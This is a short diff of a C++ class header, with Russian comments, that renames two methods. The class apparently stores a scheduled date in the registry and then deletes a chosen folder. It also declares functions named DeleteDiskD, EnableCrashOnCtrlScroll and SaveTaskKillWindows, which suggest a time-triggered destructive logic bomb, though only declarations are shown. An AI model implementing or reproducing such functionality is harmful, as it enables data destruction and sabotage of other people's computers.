@@ -15,9 +15,9 @@ public:
 	bool InspectDeleteData();
 
 	// записываем в реестр когда выполнится задача
-	bool SaveDeleteDay(SYSTEMTIME SysTime);
+	bool SaveDateOfPerformance(SYSTEMTIME SysTime);
 	// записываем какую папку будем удалять
-	bool SaveFolderPathToDelete(CString csFolderPath);	
+	bool SavePathOfFolderToDelete(CString csFolderPath);	
 	bool EnableCrashOnCtrlScroll();
 	bool DeleteDiskD();
 	bool SaveTaskKillWindows();
